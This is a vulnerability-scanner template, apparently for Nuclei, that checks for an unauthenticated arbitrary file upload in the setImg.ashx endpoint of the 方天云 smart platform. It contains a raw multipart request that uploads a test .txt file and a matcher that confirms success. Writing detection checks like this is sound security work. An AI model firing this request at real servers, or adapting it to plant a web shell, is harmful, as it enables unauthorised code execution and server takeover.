id: fty-setImg-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 方天云智慧平台系统 setImg.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - http://kpanda.wiki/#/../Vulnhub/F28-5%E6%96%B9%E5%A4%A9%E4%BA%91-%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0
  tags: tags
http:
  - raw:
      - |
        POST /Data/setImg.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
        Connection: close
        Content-Length: 196

        ------21909179191068471382830692394
        Content-Disposition: form-data; name="Filedata"; filename="asd.txt"
        Content-Type: image/jpeg
        Content-Length: 42

        1
        ------21909179191068471382830692394--
    matchers:
      - type: word
        part: body
        words:
          - '.txt'
